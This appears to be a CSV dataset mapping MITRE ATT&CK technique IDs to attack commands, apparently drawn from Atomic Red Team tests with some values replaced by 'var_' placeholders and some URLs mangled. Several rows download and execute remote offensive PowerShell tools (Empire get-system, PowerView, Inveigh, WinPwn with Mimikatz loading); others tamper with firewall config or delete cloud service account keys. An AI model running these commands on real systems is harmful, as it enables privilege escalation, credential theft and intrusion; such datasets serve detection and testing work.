mitre_id,command
T1087,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" -sc exchaddresses var_863"
T1134,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https:\\raw.githubusercontent.com\bc-security\empire\f6efd5a963d424a1f983d884b637da868e5df466\data\module_source\privesc\get-system.ps1' -usebasicparsing); get-system -technique token -verbose
T1562,"echo ""# this is a comment"" >> /etc/default/ufw grep ""# this is a comment"" /etc/default/ufw"
T1482,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https:\\raw.githubusercontent.com\powershellmafia\powersploit\f94a5d298a1b4c5dfb1f30a246d9c73d13b22888\recon\powerview.ps1' -usebasicparsing); get-foresttrust -verbose
T1098,"gcloud config set project #{project_id} key=`gcloud iam service-accounts keys list --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --format=""value(key_id)"" --limit=1` gcloud iam service-accounts keys delete $key --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --quiet"
T1557,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https:\\raw.githubusercontent.com\kevin-robertson\inveigh\82be2377ade47a4e325217b4144878a59595e750\inveigh.ps1"" -usebasicparsing) invoke-inveigh -consoleoutput y -nbns y -mdns y -https y -proxy y"
T1187,"& ""var_482 write-host ""end of petitpotam attack"""
T1484,"import-module azuread import-module aadinternals $pword = convertto-securestring -string ""var_159 write-host ""end of federation configuration."""
T1012,"get-item  -path  ""hklm:software\microsoft\windows  nt\currentversion\windows""  get-childitem  -path  ""hklm:software\microsoft\windows  nt\currentversion\""  |  findstr  windows  get-item  -path  ""hklm:software\microsoft\windows\currentversion\runservicesonce""  get-item  -path  ""hkcu:software\microsoft\windows\currentversion\runservicesonce""  get-item  -path  ""hklm:software\microsoft\windows\currentversion\runservices""  get-item  -path  ""hkcu:software\microsoft\windows\currentversion\runservices""  get-item  -path  ""hklm:software\microsoft\windows  nt\currentversion\winlogon\notify""  get-item  -path  ""hklm:software\microsoft\windows  nt\currentversion\winlogon\userinit""  get-item  -path  ""hkcu:software\microsoft\windows  nt\currentversion\winlogon\\shell""  get-item  -path  ""hklm:software\microsoft\windows  nt\currentversion\winlogon\\shell""  get-item  -path  ""hklm:software\microsoft\windows\currentversion\shellserviceobjectdelayload""  get-item  -path  ""hklm:software\microsoft\windows\currentversion\runonce""  get-item  -path  ""hklm:software\microsoft\windows\currentversion\runonceex""  get-item  -path  ""hklm:software\microsoft\windows\currentversion\run""  get-item  -path  ""hkcu:software\microsoft\windows\currentversion\run""  get-item  -path  ""hkcu:software\microsoft\windows\currentversion\runonce""  get-item  -path  ""hklm:software\microsoft\windows\currentversion\policies\explorer\run""  get-item  -path  ""hkcu:software\microsoft\windows\currentversion\policies\explorer\run""  get-childitem  -path  ""hklm:system\currentcontrolset\services""  get-item  -path  ""hklm:software\microsoft\windows\currentversion\run""  get-item  -path  ""hklm:system\currentcontrolset\control\safeboot""  get-childitem  -path  ""hklm:software\microsoft\active  setup\installed  components""  get-childitem  -path  ""hklm:software\microsoft\windows\currentversion\group  policy\scripts\startup"""
T1620,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1') mimiload -consoleoutput -noninteractive
T1133,"$extlist  =  var_859  start  chrome  start-sleep  -seconds  30  stop-process  -name  ""chrome"""
